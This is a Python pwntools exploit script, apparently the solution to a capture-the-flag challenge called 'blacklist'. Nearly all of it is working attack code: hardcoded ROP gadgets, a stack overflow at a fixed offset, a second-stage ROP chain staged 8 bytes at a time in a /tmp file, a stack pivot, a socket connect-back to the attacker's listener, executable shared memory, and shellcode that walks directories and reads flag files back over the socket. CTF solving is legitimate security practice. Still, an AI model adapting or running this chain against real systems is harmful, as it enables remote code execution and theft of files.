#!/usr/bin/env python3

"""
Run exploit locally with:
./solve.py CLEAN=1

Run against remote with:
./solve.py REMOTE CLEAN=1 HOST=blacklist.chal.perfect.blue PORT=1
"""

from ipaddress import ip_address

from pwn import *


PROG_PATH = "./blacklist"


def init_pwntools_context():
    context.binary = PROG_PATH
    context.terminal = ["tmux", "splitw", "-h"]
    # context.log_level = "debug"


def connect_to_target(do_gdb=False):
    if args.GDB or do_gdb:
        io = gdb.debug(PROG_PATH, """
            # break *0x8048970
            # break *0x08049748
            continue
        """)
    elif args.REMOTE:
        io = remote(args["HOST"], int(args["PORT"]))
    else:
        pty = process.PTY
        io = process(PROG_PATH, stdin=pty, stdout=pty, stderr=pty)

    return io


class Offsets:
    eip_overwrite = 20


class Constants:
    IPC_PRIVATE = 0
    IPC_CREAT = 0o1000

    SHM_EXEC = 0o0100000

    SHMAT = 21
    SHMGET = 23

    SHELLCODE_SIZE = 0x200

    DIR_ITER_DONE = "_x_"

    # CONNECT_IP = "159.89.53.3"
    # CONNECT_IP = "172.17.0.1"
    CONNECT_IP = "127.0.0.1"
    CONNECT_PORT = 54321
    ROP_STAGING_FILE = b"/tmp/xx\x00"


class Gadgets:
    writable_addr = 0x080d8000

    # int 0x80; ret;
    syscall = 0x0806fa30

    # ret;
    ret = 0x080481b2

    # ret;
    ret_ending_with_null = 0x08062500

    # pop eax; ret;
    pop_eax = 0x080a8dc6

    # pop ebx; ret;
    pop_ebx = 0x080481c9

    # pop ecx; and al, 0x81; ret;
    pop_ecx = 0x0807c6f5

    # pop edx; ret;
    pop_edx = 0x0805c422

    # pop esi; ret;
    pop_esi = 0x08049748

    # pop ebp; ret;
    pop_ebp = 0x0804834c

    # add ebx, ebp; ret;
    add_ebx_ebp = 0x08091100

    # pop edx; pop ecx; pop ebx; ret;
    pop_edx_ecx_ebx = 0x0806f111

    # pop ecx; pop ebx; ret;
    pop_ecx_ebx = 0x0806f112

    # pop edi; ret;
    pop_edi = 0x08049b1b

    # mov dword ptr [eax], edx; ret;
    write_edx_to_deref_eax = 0x0809d344

    # add eax, ecx; ret;
    add_eax_ecx = 0x08067a40

    # jmp eax;
    jmp_eax = 0x080517f7


def pad_rop(rop):
    assert len(rop) <= 100
    rop += b"Z" * (100 - len(rop))
    return rop


def open_rop(filename, flags, pad=True, filler=None):
    """Setup rop chain for opening a file with specified flags argument."""
    rop = b""
    rop += filename

    # This is where we may put the data we gradually write into the staging
    # file.
    if filler is not None:
        rop += filler

    assert len(rop) <= Offsets.eip_overwrite
    rop += b"A" * (Offsets.eip_overwrite - len(rop))

    # We need edx to be writable for the stack-leaking gadget.
    # 0x0809d2ca: mov edx, 0x80dc1e4; cmp byte ptr [edx], 0; jne 0x552e0; mov eax, 0x80dbfc8; mov eax, dword ptr [eax]; ret;
    rop += p32(0x0809d2ca)
    # 0x080707d8: push esp; mov dword ptr [edx], 0x18c48300; pop ebx; ret;
    rop += p32(0x080707d8)

    # open syscall arguments:
    # ebx == buf == stack address
    # ecx == flags
    # edx == mode == 0 (this is enforced by seccomp filter)
    rop += p32(Gadgets.pop_ecx)
    rop += p32(flags)
    rop += p32(Gadgets.pop_edx)
    rop += p32(0)

    # Do math on ebx to point to the file name.
    rop += p32(Gadgets.pop_ebp)
    rop += p32(0xffffffe4)
    rop += p32(Gadgets.add_ebx_ebp)

    # Load open syscall number into eax and call it.
    # 0x08093000: mov eax, 5; ret;
    rop += p32(0x08093000)
    rop += p32(Gadgets.syscall)

    if pad:
        rop = pad_rop(rop)

    return rop


def fchmod_rop(mode, pad=True):
    rop = b""

    # fchmod syscall arguments:
    # ebx == fd == 0
    # ecx == mode
    rop += p32(Gadgets.pop_ecx_ebx)
    rop += p32(mode)
    rop += p32(0)

    # Load fchmod syscall number and call it.
    rop += p32(Gadgets.pop_eax)
    rop += p32(constants.SYS_fchmod)
    rop += p32(Gadgets.syscall)

    if pad:
        rop = pad_rop(rop)

    return rop


def write_rop(filename, data, pad=True):
    rop = b""

    assert len(data) == 8
    rop += open_rop(filename, constants.O_APPEND | constants.O_RDWR, pad=False, filler=data)

    # write syscall arguments:
    # ebx == fd == 0
    # ecx == buf == stack address
    # edx == count == len(data)
    # 
    rop += p32(Gadgets.pop_edx)
    rop += p32(len(data))
    # Below gadget requires writable address in eax, so we have to set that up.
    # 0x080570ea: mov eax, 0x80da360; mov eax, dword ptr [eax]; ret;
    rop += p32(0x080570ea)
    # 0x08056eb1: mov ecx, edx; add ecx, ebx; mov dword ptr [eax + 4], ecx; xor eax, eax; pop ebx; pop esi; ret;
    rop += p32(0x08056eb1)

    rop += p32(0)
    rop += p32(0xdeadbeef)

    # Load write syscall number and call it.
    # 0x08092ff0: mov eax, 4; ret;
    rop += p32(0x08092ff0)
    rop += p32(Gadgets.syscall)

    if pad:
        rop = pad_rop(rop)

    return rop


def read_into_second_stage_rop(filename, second_stage_size, pad=True):
    rop = b""

    rop += open_rop(filename, constants.O_RDONLY, pad=False)

    # read syscall arguments:
    # ebx == fd == 0
    # ecx == buf == stack address
    # edx == count == second_stage_size
    # 
    rop += p32(Gadgets.pop_edx)
    rop += p32(second_stage_size)
    # Below gadget requires writable address in eax, so we have to set that up.
    # 0x080570ea: mov eax, 0x80da360; mov eax, dword ptr [eax]; ret;
    rop += p32(0x080570ea)
    # 0x08056eb3: add ecx, ebx; mov dword ptr [eax + 4], ecx; xor eax, eax; pop ebx; pop esi; ret;
    rop += p32(0x08056eb3)
    rop += p32(0)
    rop += p32(0xdeadbeef)

    # Load read syscall number and call it.
    # 0x08092fe0: mov eax, 3; ret;
    rop += p32(0x08092fe0)
    rop += p32(Gadgets.syscall)

    # Stack pivot.
    # 0x080a8ff3: mov esp, ecx; ret;
    rop += p32(0x080a8ff3)

    if pad:
        rop = pad_rop(rop)

    return rop


def compile_dirwalk_shellcode(dirname):
    name_storage = "0xdead0800"
    open_dir_flags = constants.O_RDONLY | constants.O_DIRECTORY
    raw_asm = "\n".join([
        "the_start:",
        # "    int3",
        shellcraft.open(dirname, oflag=open_dir_flags),
        "    cmp eax, 0",
        "    jl new_code",
        "    push eax",
        "readdir_loop:",
        "    mov ebx, [esp]",
        f"   mov ecx, {name_storage}",
        "    mov eax, SYS_readdir",
        "    int 0x80",
        "    cmp eax, 1",
        "    jne new_code",  # no more entries
        "send_name:",
        "    mov ebx, 1",
        f"   mov ecx, {name_storage}",
        "    xor edx, edx",
        "    mov dx, word ptr [ecx+8]",
        "    inc edx",  # to include the null byte
        "    add ecx, 10",  # offset to name
        "    mov eax, SYS_write",
        "    int 0x80",
        "    jmp name_cleanup_loop",
        "name_cleanup:"
        "    mov ebx, 0",
        "name_cleanup_loop:"
        "    cmp ebx, 0x200",
        "    je readdir_loop",
        f"   mov ecx, {name_storage}",
        "    add ecx, ebx",
        "    mov byte ptr [ecx], 0",
        "    inc ebx",
        "    jmp name_cleanup_loop",
        "new_code:",
        # Send signal for new code.
        "    mov ebx, 1",
        "    mov esi, 0x5f785f",  # encoded DIR_ITER_DONE
        f"   mov ecx, {name_storage}",
        "    mov dword ptr [ecx], esi",
        "    mov edx, 4",
        "    mov eax, SYS_write",
        "    int 0x80",
        # Read new code and jump to it.
        "    mov ebx, 1",
        "    mov ecx, 0xdead0000",
        f"   mov edx, {hex(Constants.SHELLCODE_SIZE)}",
        "    mov eax, SYS_read",
        "    int 0x80",
        "    jmp the_start",
    ])

    shellcode = asm(raw_asm, vma=0xdead0000)
    assert len(shellcode) <= Constants.SHELLCODE_SIZE
    shellcode += b"\x90" * (Constants.SHELLCODE_SIZE - len(shellcode))

    return shellcode


def compile_read_file_shellcode(filename):
    flag_storage = "0xdead0800"
    raw_asm = "\n".join([
        "the_start:",
        shellcraft.open(filename, oflag=constants.O_RDONLY),
        "    cmp eax, 0",
        "    jl quit",
        "    push eax",
        "read_flag:",
        "    mov ebx, [esp]",
        f"   mov ecx, {flag_storage}",
        "    mov edx, 0x100",
        "    mov eax, SYS_read",
        "    int 0x80",
        "    cmp eax, 0",
        "    jle quit",
        "write_flag:",
        "    mov ebx, 1",
        f"   mov ecx, {flag_storage}",
        "    mov edx, 0x100",
        "    mov eax, SYS_write",
        "    int 0x80",
        "quit:",
        shellcraft.exit(0)
    ])

    shellcode = asm(raw_asm, vma=0xdead0000)
    assert len(shellcode) <= Constants.SHELLCODE_SIZE
    shellcode += b"\x90" * (Constants.SHELLCODE_SIZE - len(shellcode))

    return shellcode



def prep_stage_two():
    # Second stage opens a socket back to us and sets up shellcode.
    second_stage = b""

    # args for SYS_SOCKET
    second_stage += p32(constants.AF_INET)
    second_stage += p32(constants.SOCK_STREAM)
    second_stage += p32(0)

    # args for SYS_CONNECT
    second_stage += p32(1)  # socket fd
    second_stage += p32(0xcafebabe)  # this will be changed to sockaddr address
    second_stage += p32(0x10) # addrlen

    # sockaddr
    second_stage += p16(constants.AF_INET)  # sin_family
    second_stage += p16(Constants.CONNECT_PORT, endian="big")
    second_stage += p32(int(ip_address(Constants.CONNECT_IP)), endian="big")
    second_stage += p32(0)  # padding

    assert len(second_stage) <= 24*4
    second_stage += b"B" * (24*4 - len(second_stage))

    # SYS_SOCKET via socketcall syscall
    # ebx == SYS_SOCKET == 1
    # ecx == * args == stack address
    second_stage += p32(Gadgets.pop_ebx)
    second_stage += p32(1)
    second_stage += p32(Gadgets.pop_eax)
    second_stage += p32(constants.SYS_socketcall)
    second_stage += p32(Gadgets.syscall)

    # SYS_CONNECT via socketcall syscall
    # ebx == SYS_CONNECT == 3
    # ecx == * args = stack address (moved slightly from SYS_SOCKET)
    #
    second_stage += p32(Gadgets.pop_eax)
    second_stage += p32(16)
    second_stage += p32(Gadgets.add_eax_ecx)
    # eax now points to location where we want to write sockaddr address. The
    # below gadget lets us move it into edi.
    # 0x0806b3fd: mov edi, eax; mov esi, edx; mov eax, dword ptr [esp + 4]; ret;
    second_stage += p32(0x0806b3fd)
    # Now we reset eax to point to sockaddr address.
    second_stage += p32(Gadgets.pop_eax)
    second_stage += p32(24)
    second_stage += p32(Gadgets.add_eax_ecx)
    # And write to derefenced edi with the below gadget.
    # 0x0809f788: mov dword ptr [edi], eax; pop eax; pop ebx; pop esi; pop edi; ret;
    second_stage += p32(0x0809f788)
    second_stage += p32(Gadgets.writable_addr)
    second_stage += p32(0xdeadbeef)
    second_stage += p32(0xdeadbeef)
    second_stage += p32(0xdeadbeef)
    # Now, we need ecx to point to the arguments on the stack, which we can
    # do with the following gadget:
    # 0x08056eb3: add ecx, ebx; mov dword ptr [eax + 4], ecx; xor eax, eax; pop ebx; pop esi; ret;
    second_stage += p32(Gadgets.pop_ebx)
    second_stage += p32(12)
    second_stage += p32(0x08056eb3)
    second_stage += p32(0xdeadbeef)
    second_stage += p32(0xdeadbeef)
    # Finally do the socketcall syscall.
    second_stage += p32(Gadgets.pop_ebx)
    second_stage += p32(3)
    second_stage += p32(Gadgets.pop_eax)
    second_stage += p32(constants.SYS_socketcall)
    second_stage += p32(Gadgets.syscall)

    # Now we need to setup rwx memory for the final shellcode.
    # Start with shmget call:
    # ebx == SHMGET
    # ecx == key == 11
    # edx == size == 0x1000
    # esi == shmflg
    second_stage += p32(Gadgets.pop_ebx)
    second_stage += p32(Constants.SHMGET)
    second_stage += p32(Gadgets.pop_ecx)
    second_stage += p32(Constants.IPC_PRIVATE)
    second_stage += p32(Gadgets.pop_edx)
    second_stage += p32(0x1000)
    second_stage += p32(Gadgets.pop_esi)
    second_stage += p32(Constants.IPC_CREAT | 0o777)
    second_stage += p32(Gadgets.pop_eax)
    second_stage += p32(constants.SYS_ipc)
    second_stage += p32(Gadgets.syscall)

    # Need to get returned shmid from eax into ecx. Start by getting eax into
    # ebx.
    second_stage += p32(Gadgets.pop_ecx_ebx)
    second_stage += p32(0)
    second_stage += p32(0)
    second_stage += p32(Gadgets.pop_edx)
    second_stage += p32(Gadgets.writable_addr)
    # 0x080d34e0: add ebx, eax; add dword ptr [edx], ecx; ret;
    second_stage += p32(0x080d34e0)
    # Below gadget requires writable address in eax, so we have to set that up.
    # 0x080570ea: mov eax, 0x80da360; mov eax, dword ptr [eax]; ret;
    second_stage += p32(0x080570ea)
    # 0x08056eb3: add ecx, ebx; mov dword ptr [eax + 4], ecx; xor eax, eax; pop ebx; pop esi; ret;
    second_stage += p32(0x08056eb3)
    second_stage += p32(0xdeadbeef)
    second_stage += p32(0xdeadbeef)
    # ecx now holds our shmid

    # shmat call to map segment into our address space:
    # ebx == SHMAT
    # ecx == shmid (see above)
    # edx == shmflag
    # edi == shmaddr == static address
    second_stage += p32(Gadgets.pop_ebx)
    second_stage += p32(Constants.SHMAT)
    second_stage += p32(Gadgets.pop_edi)
    second_stage += p32(0xdead0000)
    second_stage += p32(Gadgets.pop_esi)
    second_stage += p32(0xdead0000)
    second_stage += p32(Gadgets.pop_edx)
    second_stage += p32(Constants.SHM_EXEC)
    second_stage += p32(Gadgets.pop_eax)
    second_stage += p32(constants.SYS_ipc)
    second_stage += p32(Gadgets.syscall)

    # Read from the socket into our mapped segment.
    second_stage += p32(Gadgets.pop_eax)
    second_stage += p32(3)
    second_stage += p32(Gadgets.pop_ebx)
    second_stage += p32(1)
    second_stage += p32(Gadgets.pop_ecx)
    second_stage += p32(0xdead0000)
    second_stage += p32(Gadgets.pop_edx)
    second_stage += p32(Constants.SHELLCODE_SIZE)
    second_stage += p32(Gadgets.pop_eax)
    second_stage += p32(constants.SYS_read)
    second_stage += p32(Gadgets.syscall)

    # Jump to shellcode.
    second_stage += p32(Gadgets.pop_eax)
    second_stage += p32(0xdead0000)
    second_stage += p32(Gadgets.jmp_eax)

    assert len(Constants.ROP_STAGING_FILE) == 8

    # Create the rop-staging file.
    create_flags = constants.O_RDWR | constants.O_CREAT | constants.O_TRUNC
    io = connect_to_target()
    io.send(
        pad_rop(
            open_rop(Constants.ROP_STAGING_FILE, create_flags, pad=False) +
            fchmod_rop(constants.S_IRUSR | constants.S_IWUSR, pad=False)
        )
    )

    # Write second stage rop into the staging file. We can write up to 8 bytes
    # per-connection.
    def stage_data(data):
        assert len(data) == 8
        io = connect_to_target()
        io.send(write_rop(Constants.ROP_STAGING_FILE, data))

    if not len(second_stage) % 8 == 0:
        second_stage += p32(Gadgets.ret)

    for i in range(0, len(second_stage), 8):
        stage_data(second_stage[i:i+8])

    return len(second_stage)


def win():
    if args.CLEAN:
        stage_two_len = prep_stage_two()
    else:
        # Hardcoded from previous runs
        stage_two_len = 392

    log.info("Using stage two length of %i" % stage_two_len)

    def trigger_stage_two():
        listener = listen(
            Constants.CONNECT_PORT, bindaddr=Constants.CONNECT_IP, fam="ipv4"
        )
        io = connect_to_target()
        io.send(read_into_second_stage_rop(Constants.ROP_STAGING_FILE, stage_two_len))
        listener.wait_for_connection()
        return listener

    def recurse_path(current_path):
        if len(current_path.split("/")) == 5:
            log.info("Trying to read file %s" % current_path)
            io = trigger_stage_two()
            shellcode = compile_read_file_shellcode(current_path)
            io.send(shellcode)

            try:
                log.error(io.recvuntil("}", timeout=1).decode())
            except EOFError:
                pass

            return

        io = trigger_stage_two()
        shellcode = compile_dirwalk_shellcode(current_path)
        io.send(shellcode)

        children_paths = []
        while True:
            child_path = io.recvuntil(b"\x00", drop=True).decode()
            if child_path in ("..", ".",):
                continue
            elif child_path == Constants.DIR_ITER_DONE:
                log.info("Got iter dir stop sentinel")
                break

            log.info("Got child path %s" % child_path)
            children_paths.append(child_path)

        for path in children_paths:
            next_path = f"{current_path}/{path}"
            log.info("Recursing into %s" % next_path)
            recurse_path(next_path)

    recurse_path("./flag_dir")

    pause()


if __name__ == "__main__":
    init_pwntools_context()
    win()
